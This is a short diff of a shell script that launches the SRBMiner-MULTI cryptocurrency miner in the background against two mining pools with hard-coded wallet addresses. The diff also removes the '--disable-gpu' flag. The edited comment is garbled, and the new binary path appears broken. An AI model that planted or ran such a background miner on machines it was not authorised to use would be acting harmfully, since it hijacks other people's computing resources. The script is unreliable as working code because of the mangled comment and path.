@@ -19,16 +19,15 @@ cd SRBMiner-MULTI*/ || exit
 # Make executable
 chmod +x SRBMiner-MULTI
 
-# Run miner in background
-./SRBMiner-MULTI \
+# Run miner in backgrouSRBMiner-Multi-3-0-6nd
+./tmp/SRBMiner-Multi-3-0-6/SRBMiner-MULTI \
   --multi-algorithm-job-mode 3 \
-  --disable-gpu \
   --algorithm randomepic \
   --algorithm randomx \
   --pool 51pool.online:3416 \
   --pool fr-salvium.miningocean.org:8462 \
   --wallet farington#Worker01 \
-  --wallet SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm/Worker03 \
+  --wallet SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm \
   --password Worker01 \
   --password not \
   --keepalive true \
